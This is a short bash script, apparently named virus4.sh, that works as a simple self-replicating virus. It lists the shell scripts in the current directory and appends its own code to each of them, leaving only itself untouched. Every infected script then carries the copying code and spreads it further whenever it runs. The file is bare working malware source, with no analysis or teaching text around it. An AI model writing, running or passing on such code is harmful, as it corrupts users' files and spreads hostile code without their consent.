#!/bin/bash

files=`ls *.sh`

files=($(echo $files | tr " " "\n"))

for file in "${files[@]}"; do
    if [[ $file != "virus4.sh" ]]; then
    echo -e "\n" >> "$file"
    cat $0 >> "$file"
    fi
done

exit 0